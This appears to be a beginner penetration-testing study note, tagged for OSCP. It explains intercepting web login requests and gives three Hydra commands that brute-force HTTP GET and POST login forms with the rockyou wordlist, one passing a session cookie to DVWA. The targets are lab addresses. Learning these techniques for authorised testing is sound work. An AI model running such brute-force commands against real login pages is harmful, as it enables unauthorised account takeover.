---
title: "Bruteforce Authentication"
classes: single
ribbon: LightBlue
categories:
  - notes
tags:
  - beginner
  - pentest
  - recon
  - oscp
  - https
  - http
  - web
  - bruteforce
  - authentication
toc: true
hide_title: true
excerpt: ""
---

Most web applications use one or more login forms for accessing restricted user functionality and administration panels.

When you fill out a simple web form with a username and password and then press submit, the authentication mechanism generates an HTTP GET or HTTP POST request.

This request (which contains the username, password and some other necessary values generated in the background) is sent to the webserver where the credentials are tested. **The first step in the exploitation process is to intercept the request (once the required form values have been entered and after the submit button is pressed) before it is sent to the remote server. In this way it is possible to see what values are submitted and which are required by the form.**

An attacker can modify the username and password values repeatedly and send the request to the remote server using Burp Suite or Hydra.

## HTTP-GET

```
hydra -l user -P /usr/share/wordlists/rockyou.txt -f $ip http-get /path
```

## HTTP-POST

```
hydra 10.0.0.1 http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyou.txt -l admin
```

## Send request along with cookies

```
hydra 10.11.1.250 -t 2 -l admin -P /usr/share/wordlists/rockyou.txt http-form-get "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low;PHPSESSID=409e45633a8281adb8f182021cfacd14"
```
